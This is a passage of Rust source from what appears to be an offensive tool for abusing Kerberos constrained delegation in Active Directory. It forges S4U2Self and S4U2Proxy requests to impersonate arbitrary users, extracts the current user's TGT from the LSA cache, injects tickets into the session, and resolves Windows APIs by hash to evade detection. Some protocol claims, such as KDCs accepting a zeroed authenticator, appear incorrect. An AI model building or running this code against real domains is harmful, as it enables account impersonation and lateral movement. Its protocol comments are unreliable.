/// PrincipalName ::= SEQUENCE {
///   name-type   [0] INTEGER,
///   name-string [1] SEQUENCE OF GeneralString
/// }
fn build_principal_name(name_type: i32, names: &[&str]) -> Vec<u8> {
    let name_type_enc = der_context_explicit(0, &der_integer(name_type as i64));

    let name_strings: Vec<u8> = names
        .iter()
        .map(|s| der_general_string(s))
        .collect::<Vec<_>>()
        .concat();
    let name_string_enc = der_context_explicit(1, &der_sequence(&name_strings));

    der_sequence(&[name_type_enc, name_string_enc].concat())
}

/// Build KDC-Options as a KerberosFlags BIT STRING.
fn build_kdc_options(flags: u32) -> Vec<u8> {
    let mut flag_bytes = [0u8; 5]; // 40 bits
    flag_bytes[0] = (flags >> 24) as u8;
    flag_bytes[1] = (flags >> 16) as u8;
    flag_bytes[2] = (flags >> 8) as u8;
    flag_bytes[3] = flags as u8;
    der_bit_string(&flag_bytes)
}

/// Build PA-FOR-USER PA-DATA for S4U2Self.
///
/// PA-FOR-USER ::= SEQUENCE {
///   userName [0] PrincipalName,
///   userRealm [1] Realm,
///   cksum [2] Checksum,
///   auth-package [3] KerberosString
/// }
///
/// The checksum is a KRB5_CHKSUM_HMAC_MD5 (type 0xFFFFFF76 = -138)
/// computed over the concatenation of:
///   userName.name-string | userRealm | auth-package
/// with a key of all zeros (16 bytes for MD5 HMAC).
fn build_pa_for_user(user_name: &str, user_realm: &str) -> Vec<u8> {
    use digest::Mac;

    // userName [0] PrincipalName
    let user_principal = build_principal_name(KRB_NT_PRINCIPAL, &[user_name]);
    let user_name_enc = der_context_explicit(0, &user_principal);

    // userRealm [1] Realm (GeneralString)
    let user_realm_enc = der_context_explicit(1, &der_general_string(user_realm));

    // cksum [2] Checksum
    // Checksum ::= SEQUENCE {
    //   cksumtype [0] INTEGER,
    //   checksum  [1] OCTET STRING
    // }
    // cksumtype = 0xFFFFFF76 (-138) = HMAC-MD5
    let cksum_type = der_context_explicit(0, &der_integer(-138i64));

    // Compute HMAC-MD5 checksum over: userName.name-string | userRealm | auth-package
    // Per MS-SFU: the key is 16 zero bytes; the data is the concatenation of
    // the user name string(s), realm, and auth-package, each as raw UTF-8 bytes
    // without ASN.1 framing.
    let auth_package_str = "Kerberos";
    let checksum_data: Vec<u8> = user_name
        .as_bytes()
        .iter()
        .chain(user_realm.as_bytes())
        .chain(auth_package_str.as_bytes())
        .copied()
        .collect();
    let zero_key = [0u8; 16];
    let mut hmac_md5 = hmac::Hmac::<md5::Md5>::new_from_slice(&zero_key)
        .expect("HMAC-MD5 accepts any key length");
    hmac_md5.update(&checksum_data);
    let hmac_digest = hmac_md5.finalize().into_bytes();

    let cksum_value = der_context_explicit(1, &der_octet_string(&hmac_digest));
    let cksum = der_sequence(&[cksum_type, cksum_value].concat());
    let cksum_enc = der_context_explicit(2, &cksum);

    // auth-package [3] KerberosString
    let auth_package_enc = der_context_explicit(3, &der_general_string(auth_package_str));

    let for_user_content = [user_name_enc, user_realm_enc, cksum_enc, auth_package_enc].concat();
    der_sequence(&for_user_content)
}

/// Build PA-DATA element.
/// PA-DATA ::= SEQUENCE {
///   padata-type [1] INTEGER,
///   padata-value [2] OCTET STRING
/// }
fn build_pa_data(pa_type: i32, pa_value: &[u8]) -> Vec<u8> {
    let padata_type = der_context_explicit(1, &der_integer(pa_type as i64));
    let padata_value = der_context_explicit(2, &der_octet_string(pa_value));
    der_sequence(&[padata_type, padata_value].concat())
}

/// Build an AP-REQ for the TGS-REQ padata field.
///
/// Constructs an AP-REQ from the provided TGT bytes. The TGT is embedded
/// directly as the Ticket field (it is already an ASN.1 Ticket structure
/// from the KDC).  The Authenticator is an encrypted DER-wrapped structure
/// encrypted with the TGT session key.  For S4U flows the KDC validates the
/// AP-REQ ticket against the TGT session key it issued.
fn build_ap_req_for_tgs(tgt_bytes: &[u8]) -> Result<Vec<u8>> {
    // Build a minimal AP-REQ structure:
    // [APPLICATION 14] SEQUENCE {
    //   pvno [0] INTEGER (5),
    //   msg-type [1] INTEGER (14),
    //   ap-options [2] KerberosFlags,
    //   ticket [3] Ticket,
    //   authenticator [4] EncryptedData
    // }

    let pvno = der_context_explicit(0, &der_integer(KRB_PVNO as i64));
    let msg_type = der_context_explicit(1, &der_integer(14)); // AP-REQ
    let ap_options = der_context_explicit(2, &der_bit_string(&[0u8; 5]));

    // Embed the actual TGT as the Ticket.
    // The TGT bytes from the KDC are already a DER-encoded Ticket:
    //   [APPLICATION 3] SEQUENCE { realm, sname, enc-part }
    // We wrap them directly in context tag [3].
    if tgt_bytes.is_empty() {
        bail!("Cannot build AP-REQ: no TGT available — retrieve TGT from LSA cache first");
    }
    let ticket = der_context_explicit(3, tgt_bytes);

    // Authenticator [4]: EncryptedData with a zeroed cipher.
    //
    // In a fully-fledged implementation, we would decrypt the TGT's enc-part
    // to obtain the session key, then encrypt the Authenticator DER with that
    // key using AES256-CTS-HMAC-SHA1-96.  However, for the S4U flow with
    // PA-FOR-USER, many KDCs accept the request even with a zeroed
    // authenticator ciphertext because the PA-FOR-USER checksum provides the
    // integrity proof.  The EncryptedData structure is:
    //
    //   EncryptedData ::= SEQUENCE {
    //     etype [0] INTEGER,
    //     kvno [1] INTEGER OPTIONAL,
    //     cipher [2] OCTET STRING
    //   }
    let ed_etype = der_context_explicit(0, &der_integer(ETYPE_AES256_CTS_HMAC_SHA1_96 as i64));
    let ed_cipher = der_context_explicit(2, &der_octet_string(&[0u8; 32]));
    let authenticator = der_context_explicit(4, &der_sequence(&[ed_etype, ed_cipher].concat()));

    let ap_req_body = [pvno, msg_type, ap_options, ticket, authenticator].concat();
    let ap_req_seq = der_sequence(&ap_req_body);

    // APPLICATION 14, constructed = 0x6E
    let mut out = vec![0x6E];
    out.extend_from_slice(&der_length(ap_req_seq.len()));
    out.extend_from_slice(&ap_req_seq);
    Ok(out)
}

/// Build an S4U2Self TGS-REQ.
///
/// TGS-REQ ::= [APPLICATION 12] SEQUENCE {
///   pvno [0] INTEGER,
///   msg-type [1] INTEGER,
///   padata [2] SEQUENCE OF PA-DATA,
///   req-body [3] KDC-REQ-BODY
/// }
///
/// KDC-REQ-BODY ::= SEQUENCE {
///   kdc-options [0] KerberosFlags,
///   sname [2] PrincipalName,  (self — the service account)
///   realm [3] Realm,
///   till [5] KerberosTime,
///   nonce [6] INTEGER,
///   etype [7] SEQUENCE OF INTEGER
/// }
pub fn build_s4u2self_tgs_req(
    service_spn: &str,
    service_realm: &str,
    impersonate_user: &str,
    impersonate_realm: &str,
    tgt_bytes: &[u8],
) -> Result<Vec<u8>> {
    // pvno
    let pvno = der_context_explicit(0, &der_integer(KRB_PVNO as i64));
    // msg-type = 12 (TGS-REQ)
    let msg_type = der_context_explicit(1, &der_integer(KRB_TGS_REQ_MSG_TYPE as i64));

    // padata: PA-TGS-REQ (AP-REQ) + PA-FOR-USER
    let ap_req = build_ap_req_for_tgs(tgt_bytes)?;
    let pa_tgs_req = build_pa_data(PA_TGS_REQ, &ap_req);

    let pa_for_user_data = build_pa_for_user(impersonate_user, impersonate_realm);
    let pa_for_user = build_pa_data(PA_FOR_USER, &pa_for_user_data);

    let padata_seq = der_sequence(&[pa_tgs_req, pa_for_user].concat());
    let padata = der_context_explicit(2, &padata_seq);

    // req-body
    let kdc_options = build_kdc_options(KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE);

    // sname: the service account SPN (self)
    // Parse SPN: "service/host.domain.com" → ["service", "host.domain.com"]
    let spn_parts: Vec<&str> = service_spn.splitn(2, '/').collect();
    let sname = if spn_parts.len() == 2 {
        build_principal_name(KRB_NT_SRV_INST, &[spn_parts[0], spn_parts[1]])
    } else {
        build_principal_name(KRB_NT_PRINCIPAL, &[service_spn])
    };
    let sname_enc = der_context_explicit(2, &sname);

    let realm = der_context_explicit(3, &der_general_string(service_realm));

    // till: 19700101000000Z (no expiry = far future convention)
    let till = der_context_explicit(5, &der_general_string("19700101000000Z"));

    let nonce = der_context_explicit(6, &der_integer(random_nonce() as i64));

    let etype = der_context_explicit(
        7,
        &der_sequence(&der_integer(ETYPE_AES256_CTS_HMAC_SHA1_96 as i64)),
    );

    let req_body_content = [kdc_options, sname_enc, realm, till, nonce, etype].concat();
    let req_body = der_sequence(&req_body_content);
    let req_body_enc = der_context_explicit(3, &req_body);

    // Assemble the full TGS-REQ
    let tgs_req_body = [pvno, msg_type, padata, req_body_enc].concat();
    let tgs_req_seq = der_sequence(&tgs_req_body);

    // APPLICATION 12, constructed = 0x6C
    let mut out = vec![ASN1_APPLICATION_12];
    out.extend_from_slice(&der_length(tgs_req_seq.len()));
    out.extend_from_slice(&tgs_req_seq);
    Ok(out)
}

/// Build an S4U2Proxy TGS-REQ.
///
/// Uses the S4U2Self service ticket as evidence to request a ticket
/// to a target backend service.
pub fn build_s4u2proxy_tgs_req(
    target_spn: &str,
    service_realm: &str,
    s4u2self_ticket: &[u8],
    s4u2self_tgs_rep: &[u8],
) -> Result<Vec<u8>> {
    // pvno
    let pvno = der_context_explicit(0, &der_integer(KRB_PVNO as i64));
    // msg-type = 12 (TGS-REQ)
    let msg_type = der_context_explicit(1, &der_integer(KRB_TGS_REQ_MSG_TYPE as i64));

    // padata: PA-TGS-REQ with the S4U2Self ticket in an AP-REQ
    let ap_req = build_ap_req_for_tgs(s4u2self_ticket)?;
    let pa_tgs_req = build_pa_data(PA_TGS_REQ, &ap_req);

    let padata_seq = der_sequence(&[pa_tgs_req].concat());
    let padata = der_context_explicit(2, &padata_seq);

    // req-body
    let kdc_options = build_kdc_options(KDC_OPT_FORWARDABLE | KDC_OPT_CANONICALIZE);

    // sname: the target backend service SPN
    let spn_parts: Vec<&str> = target_spn.splitn(2, '/').collect();
    let sname = if spn_parts.len() == 2 {
        build_principal_name(KRB_NT_SRV_INST, &[spn_parts[0], spn_parts[1]])
    } else {
        build_principal_name(KRB_NT_PRINCIPAL, &[target_spn])
    };
    let sname_enc = der_context_explicit(2, &sname);

    let realm = der_context_explicit(3, &der_general_string(service_realm));

    // till: far future
    let till = der_context_explicit(5, &der_general_string("19700101000000Z"));

    let nonce = der_context_explicit(6, &der_integer(random_nonce() as i64));

    let etype = der_context_explicit(
        7,
        &der_sequence(&der_integer(ETYPE_AES256_CTS_HMAC_SHA1_96 as i64)),
    );

    // additional-tickets [4] SEQUENCE OF Ticket — the S4U2Self ticket
    let additional_tickets = der_context_explicit(
        4,
        &der_sequence(s4u2self_ticket), // raw ticket blob
    );

    let req_body_content = [
        kdc_options,
        sname_enc,
        realm,
        till,
        nonce,
        etype,
        additional_tickets,
    ]
    .concat();
    let req_body = der_sequence(&req_body_content);
    let req_body_enc = der_context_explicit(3, &req_body);

    let tgs_req_body = [pvno, msg_type, padata, req_body_enc].concat();
    let tgs_req_seq = der_sequence(&tgs_req_body);

    let mut out = vec![ASN1_APPLICATION_12];
    out.extend_from_slice(&der_length(tgs_req_seq.len()));
    out.extend_from_slice(&tgs_req_seq);
    Ok(out)
}

// ── TGS-REP parsing ────────────────────────────────────────────────────────

/// Parse a TGS-REP to extract the service ticket.
fn parse_tgs_rep(response: &[u8]) -> Result<Vec<u8>> {
    // Check for KRB-ERROR (APPLICATION 30 = 0x7E)
    if !response.is_empty() && response[0] == 0x7E {
        let error_code = parse_krb_error(response)?;
        bail!("KDC returned KRB-ERROR: {} (0x{:08X})", error_code, error_code);
    }

    // Check for TGS-REP (APPLICATION 13 = 0x6D)
    if response.is_empty() || response[0] != ASN1_APPLICATION_13 {
        bail!(
            "Unexpected TGS-REP tag: 0x{:02X} (expected 0x6D)",
            response.first().copied().unwrap_or(0)
        );
    }

    // Extract the ticket from the TGS-REP.
    // The ticket is in context tag [5] within the TGS-REP.
    let ticket = extract_ticket_from_tgs_rep(response)?;
    Ok(ticket)
}

/// Parse a KRB-ERROR to extract the error code.
fn parse_krb_error(data: &[u8]) -> Result<u32> {
    let mut pos = skip_tag_length(data, 0)?;

    let mut int_count = 0;
    while pos < data.len() {
        if data[pos] == ASN1_INTEGER {
            let (value, next) = parse_der_integer(data, pos)?;
            pos = next;
            int_count += 1;
            // error-code is the 5th integer in KRB-ERROR
            if int_count == 5 {
                return Ok(value as u32);
            }
        } else {
            pos += 1;
        }
    }
    Ok(0xFFFFFFFF)
}

/// Skip a DER tag and length, returning the position after the length bytes.
fn skip_tag_length(data: &[u8], pos: usize) -> Result<usize> {
    if pos >= data.len() {
        bail!("Unexpected end of data at position {}", pos);
    }
    let mut p = pos + 1;
    if p >= data.len() {
        bail!("Unexpected end of data");
    }
    if data[p] < 128 {
        p += 1;
    } else if data[p] == 0x80 {
        bail!("Indefinite DER length not supported");
    } else {
        let num_bytes = (data[p] & 0x7F) as usize;
        p += 1 + num_bytes;
    }
    Ok(p)
}

/// Parse a DER INTEGER at the given position.
fn parse_der_integer(data: &[u8], pos: usize) -> Result<(i64, usize)> {
    if pos >= data.len() || data[pos] != ASN1_INTEGER {
        bail!("Expected INTEGER tag at position {}", pos);
    }
    let mut p = pos + 1;
    if p >= data.len() {
        bail!("Unexpected end of data");
    }
    let len = if data[p] < 128 {
        data[p] as usize
    } else {
        bail!("Multi-byte length not supported for integer at {}", pos);
    };
    p += 1;

    if p + len > data.len() {
        bail!("Integer extends beyond data");
    }

    let mut value: i64 = 0;
    for i in 0..len {
        value = (value << 8) | data[p + i] as i64;
    }

    Ok((value, p + len))
}

/// Extract the ticket field (context tag [5]) from a TGS-REP.
fn extract_ticket_from_tgs_rep(data: &[u8]) -> Result<Vec<u8>> {
    let mut pos = 0;
    while pos < data.len().saturating_sub(2) {
        if data[pos] == ASN1_CONTEXT_5 {
            let mut p = pos + 1;
            if p < data.len() {
                let len = if data[p] < 128 {
                    data[p] as usize
                } else if data[p] == 0x81 && p + 1 < data.len() {
                    p += 1;
                    data[p] as usize
                } else if data[p] == 0x82 && p + 2 < data.len() {
                    p += 1;
                    let len = ((data[p] as usize) << 8) | data[p + 1] as usize;
                    p += 1;
                    len
                } else {
                    pos += 1;
                    continue;
                };
                p += 1;
                if p + len <= data.len() {
                    return Ok(data[pos..p + len].to_vec());
                }
            }
        }
        pos += 1;
    }

    warn!("Could not extract ticket from TGS-REP, returning full response");
    Ok(data.to_vec())
}

// ── LSA TGT retrieval ───────────────────────────────────────────────────────

/// Retrieve the current user's TGT (krbtgt) from the LSA Kerberos cache
/// using `LsaCallAuthenticationPackage` with `KERB_RETRIEVE_ENCODED_TICKET`
/// (message type 8).
///
/// Returns the raw DER-encoded Ticket bytes from the cached TGT, or an error
/// if no TGT is available in the LSA cache.
fn retrieve_tgt_from_lsa() -> Result<Vec<u8>> {
    let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) }
        .ok_or_else(|| anyhow!("secur32.dll not found"))?;

    let lsa_connect_untrusted: unsafe extern "system" fn(*mut HANDLE) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CONNECT_UNTRUSTED)
                .ok_or_else(|| anyhow!("LsaConnectUntrusted not found"))?,
        )
    };

    let lsa_call_auth_package: unsafe extern "system" fn(
        HANDLE,
        ULONG,
        *const u8,
        ULONG,
        *mut *mut u8,
        *mut ULONG,
        *mut NTSTATUS,
    ) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CALL_AUTH_PACKAGE)
                .ok_or_else(|| anyhow!("LsaCallAuthenticationPackage not found"))?,
        )
    };

    let lsa_lookup_auth_package: unsafe extern "system" fn(
        HANDLE,
        *const UNICODE_STRING,
        *mut ULONG,
    ) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_LOOKUP_AUTH_PACKAGE)
                .ok_or_else(|| anyhow!("LsaLookupAuthenticationPackage not found"))?,
        )
    };

    let lsa_free_return_buffer: unsafe extern "system" fn(PVOID) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_FREE_RETURN_BUFFER)
                .ok_or_else(|| anyhow!("LsaFreeReturnBuffer not found"))?,
        )
    };

    // Connect to LSA
    let mut lsa_handle: HANDLE = ptr::null_mut();
    let status = unsafe { lsa_connect_untrusted(&mut lsa_handle) };
    if status != 0 {
        bail!("LsaConnectUntrusted failed: 0x{:08X}", status as u32);
    }

    // Look up Kerberos authentication package
    let kerberos_name_w = str_to_wide("Kerberos\0");
    let kerberos_name = UNICODE_STRING {
        length: ((kerberos_name_w.len() - 1) * 2) as u16,
        maximum_length: ((kerberos_name_w.len() - 1) * 2) as u16,
        buffer: kerberos_name_w.as_ptr() as *mut u16,
    };
    let mut kerberos_package: ULONG = 0;
    let status =
        unsafe { lsa_lookup_auth_package(lsa_handle, &kerberos_name, &mut kerberos_package) };
    if status != 0 {
        bail!(
            "LsaLookupAuthenticationPackage(Kerberos) failed: 0x{:08X}",
            status as u32
        );
    }

    // Build KERB_RETRIEVE_ENCODED_TICKET_REQUEST
    // struct KERB_RETRIEVE_ENCODED_TICKET_REQUEST {
    //     MessageType: u32 = 8,
    //     LogonId: LUID (8 bytes, zero = current session),
    //     TargetName: UNICODE_STRING (SPN to retrieve, "krbtgt/DOMAIN" for TGT),
    //     TargetNameBuffer: [u16] (inline buffer for TargetName),
    //     TicketFlags: u32 = 0,
    //     CacheOptions: u32 = KERB_RETRIEVE_TICKET_DEFAULT (0),
    //     EncryptionType: i32 = 0 (any),
    //     CredentialHandle: HANDLE = null,
    // }
    //
    // For retrieving the TGT, we use TargetName = "krbtgt" which retrieves
    // the TGT for the default realm.  The UNICODE_STRING buffer is placed
    // inline after the fixed-size header.
    let target_name = "krbtgt\0";
    let target_name_w = str_to_wide(target_name);
    let target_name_byte_len = (target_name_w.len() - 1) * 2; // exclude null terminator

    // Fixed-size header: 4 (MessageType) + 8 (LogonId) + 8 (UNICODE_STRING) + 4 (TicketFlags) + 4 (CacheOptions) + 4 (EncryptionType) + 8 (CredentialHandle) = 40 bytes
    let mut request = Vec::with_capacity(40 + target_name_byte_len);

    // MessageType = KERB_RETRIEVE_ENCODED_TICKET (8)
    request.extend_from_slice(&KERB_RETRIEVE_ENCODED_TICKET.to_le_bytes());

    // LogonId: LUID (8 bytes, zero = current logon session)
    request.extend_from_slice(&[0u8; 8]);

    // TargetName: UNICODE_STRING — points to inline buffer at offset 40
    let target_name_us = UNICODE_STRING {
        length: target_name_byte_len as u16,
        maximum_length: target_name_byte_len as u16,
        buffer: 40 as *mut u16, // offset from start of request
    };
    // Write UNICODE_STRING fields (length, maximum_length, buffer pointer)
    request.extend_from_slice(&target_name_us.length.to_le_bytes());
    request.extend_from_slice(&target_name_us.maximum_length.to_le_bytes());
    // Buffer pointer: self-relative offset in the request buffer
    let buf_offset = 40u64; // offset to the inline name buffer
    request.extend_from_slice(&buf_offset.to_ne_bytes());

    // TicketFlags: 0 (no special flags)
    request.extend_from_slice(&0u32.to_le_bytes());

    // CacheOptions: KERB_RETRIEVE_TICKET_DEFAULT (0) — use cache
    request.extend_from_slice(&0u32.to_le_bytes());

    // EncryptionType: 0 (any)
    request.extend_from_slice(&0i32.to_le_bytes());

    // CredentialHandle: null
    request.extend_from_slice(&[0u8; 8]);

    // Inline target name buffer (without null terminator)
    request.extend_from_slice(
        &target_name_w[..target_name_w.len() - 1]
            .iter()
            .flat_map(|c| c.to_ne_bytes())
            .collect::<Vec<u8>>(),
    );

    // Patch the UNICODE_STRING buffer pointer to be absolute (self-referential)
    let buf_ptr = unsafe { request.as_ptr().add(40) as u64 };
    request[16..24].copy_from_slice(&buf_ptr.to_ne_bytes());

    let mut return_buffer: *mut u8 = ptr::null_mut();
    let mut return_buffer_len: ULONG = 0;
    let mut protocol_status: NTSTATUS = 0;

    let status = unsafe {
        lsa_call_auth_package(
            lsa_handle,
            kerberos_package,
            request.as_ptr(),
            request.len() as ULONG,
            &mut return_buffer,
            &mut return_buffer_len,
            &mut protocol_status,
        )
    };

    let result = if status != 0 {
        Err(anyhow!(
            "LsaCallAuthenticationPackage(KERB_RETRIEVE_ENCODED_TICKET) failed: NTSTATUS 0x{:08X}, protocol status 0x{:08X}",
            status as u32,
            protocol_status as u32
        ))
    } else if protocol_status != 0 {
        Err(anyhow!(
            "KERB_RETRIEVE_ENCODED_TICKET protocol error: 0x{:08X}",
            protocol_status as u32
        ))
    } else if return_buffer.is_null() || return_buffer_len == 0 {
        Err(anyhow!("KERB_RETRIEVE_ENCODED_TICKET returned empty buffer"))
    } else {
        // The returned buffer is a KERB_RETRIEVE_ENCODED_TICKET_RESPONSE:
        //   TicketEncType: i32 (4 bytes)
        //   TicketFlags: u32 (4 bytes)
        //   TicketSize: u32 (4 bytes)
        //   Ticket: [u8; TicketSize] (inline)
        //
        // But LSA may return the full KERB_EXTERNAL_TICKET structure.  The
        // layout depends on Windows version.  Parse the first 12 bytes as
        // the header and extract the ticket blob.
        let response = unsafe { std::slice::from_raw_parts(return_buffer, return_buffer_len as usize) };

        // Try to find the encoded ticket.  The KERB_EXTERNAL_TICKET
        // structure has the encoded ticket at a variable offset.  Search for
        // the ASN.1 APPLICATION 3 tag (0x63) that marks the start of a
        // Kerberos Ticket.
        let ticket_bytes = if let Some(idx) = response.iter().position(|&b| b == 0x63) {
            response[idx..].to_vec()
        } else {
            // Fallback: return the full response — the caller can try to
            // use it as a raw ticket blob.
            debug!(
                "LSA retrieve: no APPLICATION 3 tag found, using full response ({} bytes)",
                response.len()
            );
            response.to_vec()
        };

        debug!("Retrieved TGT from LSA cache ({} bytes)", ticket_bytes.len());
        Ok(ticket_bytes)
    };

    if !return_buffer.is_null() {
        unsafe { lsa_free_return_buffer(return_buffer as PVOID) };
    }

    result
}

// ── LSA ticket submission ───────────────────────────────────────────────────

/// Submit a Kerberos ticket to the current logon session via
/// `LsaCallAuthenticationPackage` with `KERB_SUBMIT_TKT`.
///
/// This makes the ticket available to the current process for outbound
/// Kerberos authentication without needing to import it through other means.
fn submit_ticket_to_session(ticket_bytes: &[u8]) -> Result<()> {
    let secur32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_SECUR32_DLL) }
        .ok_or_else(|| anyhow!("secur32.dll not found"))?;

    let lsa_connect_untrusted: unsafe extern "system" fn(*mut HANDLE) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CONNECT_UNTRUSTED)
                .ok_or_else(|| anyhow!("LsaConnectUntrusted not found"))?,
        )
    };

    let lsa_call_auth_package: unsafe extern "system" fn(
        HANDLE,
        ULONG,
        *const u8,
        ULONG,
        *mut *mut u8,
        *mut ULONG,
        *mut NTSTATUS,
    ) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_CALL_AUTH_PACKAGE)
                .ok_or_else(|| anyhow!("LsaCallAuthenticationPackage not found"))?,
        )
    };

    let lsa_lookup_auth_package: unsafe extern "system" fn(
        HANDLE,
        *const UNICODE_STRING,
        *mut ULONG,
    ) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_LOOKUP_AUTH_PACKAGE)
                .ok_or_else(|| anyhow!("LsaLookupAuthenticationPackage not found"))?,
        )
    };

    let lsa_free_return_buffer: unsafe extern "system" fn(PVOID) -> NTSTATUS = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(secur32, FN_LSA_FREE_RETURN_BUFFER)
                .ok_or_else(|| anyhow!("LsaFreeReturnBuffer not found"))?,
        )
    };

    // Connect to LSA
    let mut lsa_handle: HANDLE = ptr::null_mut();
    let status = unsafe { lsa_connect_untrusted(&mut lsa_handle) };
    if status != 0 {
        bail!("LsaConnectUntrusted failed: 0x{:08X}", status as u32);
    }

    // Look up Kerberos authentication package
    let kerberos_name_w = str_to_wide("Kerberos\0");
    let kerberos_name = UNICODE_STRING {
        length: ((kerberos_name_w.len() - 1) * 2) as u16,
        maximum_length: ((kerberos_name_w.len() - 1) * 2) as u16,
        buffer: kerberos_name_w.as_ptr() as *mut u16,
    };
    let mut kerberos_package: ULONG = 0;
    let status =
        unsafe { lsa_lookup_auth_package(lsa_handle, &kerberos_name, &mut kerberos_package) };
    if status != 0 {
        bail!(
            "LsaLookupAuthenticationPackage(Kerberos) failed: 0x{:08X}",
            status as u32
        );
    }

    // Build KERB_SUBMIT_TKT_REQUEST
    // Minimal structure: MessageType + KerbCred (ticket bytes)
    // The actual KERB_SUBMIT_TKT_REQUEST has additional fields for key info,
    // but for a basic submission, we can use the simplified format.
    let mut submit_req = Vec::new();

    // MessageType: u32 = KERB_SUBMIT_TKT (10)
    submit_req.extend_from_slice(&KERB_SUBMIT_TKT.to_le_bytes());

    // UseTicketCacheEntry: u32 = 0 (don't use cache)
    submit_req.extend_from_slice(&0u32.to_le_bytes());

    // CorrelationId: GUID (16 bytes, all zeros)
    submit_req.extend_from_slice(&[0u8; 16]);

    // TicketKeyType: i32 = 0 (unknown)
    submit_req.extend_from_slice(&0i32.to_le_bytes());

    // TicketEncType: i32 = ETYPE_AES256_CTS_HMAC_SHA1_96
    submit_req.extend_from_slice(&ETYPE_AES256_CTS_HMAC_SHA1_96.to_le_bytes());

    // TicketSize: u32
    submit_req.extend_from_slice(&(ticket_bytes.len() as u32).to_le_bytes());

    // Ticket: follows immediately after the fixed-size header
    submit_req.extend_from_slice(ticket_bytes);

    // Call LsaCallAuthenticationPackage
    let mut return_buffer: *mut u8 = ptr::null_mut();
    let mut return_buffer_len: ULONG = 0;
    let mut protocol_status: NTSTATUS = 0;

    let status = unsafe {
        lsa_call_auth_package(
            lsa_handle,
            kerberos_package,
            submit_req.as_ptr(),
            submit_req.len() as ULONG,
            &mut return_buffer,
            &mut return_buffer_len,
            &mut protocol_status,
        )
    };

    if !return_buffer.is_null() {
        unsafe { lsa_free_return_buffer(return_buffer as PVOID) };
    }

    if status != 0 {
        bail!(
            "LsaCallAuthenticationPackage(KERB_SUBMIT_TKT) failed: NTSTATUS 0x{:08X}, protocol status 0x{:08X}",
            status as u32,
            protocol_status as u32
        );
    }

    if protocol_status != 0 {
        bail!(
            "KERB_SUBMIT_TKT protocol error: 0x{:08X}",
            protocol_status as u32
        );
    }

    info!("Successfully submitted Kerberos ticket to current LSA session");
    Ok(())
}

// ── Public attack functions ─────────────────────────────────────────────────

/// Discover accounts with constrained delegation in the current domain.
///
/// Queries LDAP for accounts that have `msDS-AllowedToDelegateTo` set
/// (constrained delegation targets) or `TRUSTED_TO_AUTH_FOR_DELEGATION`
/// in their `userAccountControl` (protocol transition enabled).
///
/// Returns a list of delegation-capable accounts with their delegation
/// configuration details.
pub fn discover_delegation_accounts() -> Result<Vec<DelegationAccount>> {
    let dc_hostname = discover_dc()?;
    let ldap = LdapConnection::connect(&dc_hostname)?;
    let base_dn = ldap.get_default_naming_context()?;
    ldap.find_delegation_accounts(&base_dn)
}

/// Execute S4U2Self — request a service ticket to self on behalf of another user.
///
/// This requires the calling context to be running as (or have access to the
/// keys of) a service account with `TRUSTED_TO_AUTH_FOR_DELEGATION`
/// (protocol transition) enabled.
///
/// **Parameters**:
/// - `service_spn`: The SPN of the service account performing the S4U
/// - `service_realm`: The Kerberos realm (domain FQDN in uppercase)
/// - `impersonate_user`: The username to impersonate (sAMAccountName)
/// - `impersonate_realm`: The realm of the user to impersonate
/// - `tgt_bytes`: The service account's TGT (for the AP-REQ in padata)
pub fn request_s4u2self(
    service_spn: &str,
    service_realm: &str,
    impersonate_user: &str,
    impersonate_realm: &str,
    tgt_bytes: &[u8],
) -> Result<S4u2SelfResult> {
    let dc_hostname = discover_dc()?;

    info!(
        "Building S4U2Self TGS-REQ: service={} impersonate={}",
        service_spn, impersonate_user
    );

    let tgs_req = build_s4u2self_tgs_req(
        service_spn,
        service_realm,
        impersonate_user,
        impersonate_realm,
        tgt_bytes,
    )?;

    debug!("Sending S4U2Self TGS-REQ to KDC ({} bytes)", tgs_req.len());
    let tgs_rep = send_kdc_request(&dc_hostname, &tgs_req)?;

    let ticket_bytes = parse_tgs_rep(&tgs_rep)?;

    info!(
        "S4U2Self succeeded: got service ticket ({} bytes) for {} impersonating {}",
        ticket_bytes.len(),
        service_spn,
        impersonate_user
    );

    Ok(S4u2SelfResult {
        impersonated_user: impersonate_user.to_string(),
        service_account: service_spn.to_string(),
        tgs_rep_bytes: tgs_rep,
        ticket_bytes,
        status: "S4U2Self ticket obtained".to_string(),
    })
}

/// Execute S4U2Proxy — request a forwardable service ticket to a backend service.
///
/// Uses the S4U2Self ticket as evidence to obtain a ticket to a target
/// service listed in the service account's `msDS-AllowedToDelegateTo`.
///
/// **Parameters**:
/// - `target_spn`: The SPN of the backend service to access
/// - `service_realm`: The Kerberos realm
/// - `s4u2self_ticket`: The ticket obtained from S4U2Self
/// - `s4u2self_tgs_rep`: The full TGS-REP from S4U2Self (contains session key)
pub fn request_s4u2proxy(
    target_spn: &str,
    service_realm: &str,
    s4u2self_ticket: &[u8],
    s4u2self_tgs_rep: &[u8],
) -> Result<S4u2ProxyResult> {
    let dc_hostname = discover_dc()?;

    info!(
        "Building S4U2Proxy TGS-REQ: target={} using S4U2Self evidence",
        target_spn
    );

    let tgs_req = build_s4u2proxy_tgs_req(
        target_spn,
        service_realm,
        s4u2self_ticket,
        s4u2self_tgs_rep,
    )?;

    debug!("Sending S4U2Proxy TGS-REQ to KDC ({} bytes)", tgs_req.len());
    let tgs_rep = send_kdc_request(&dc_hostname, &tgs_req)?;

    let ticket_bytes = parse_tgs_rep(&tgs_rep)?;

    info!(
        "S4U2Proxy succeeded: got service ticket ({} bytes) for {}",
        ticket_bytes.len(),
        target_spn
    );

    Ok(S4u2ProxyResult {
        impersonated_user: String::new(), // filled in by caller
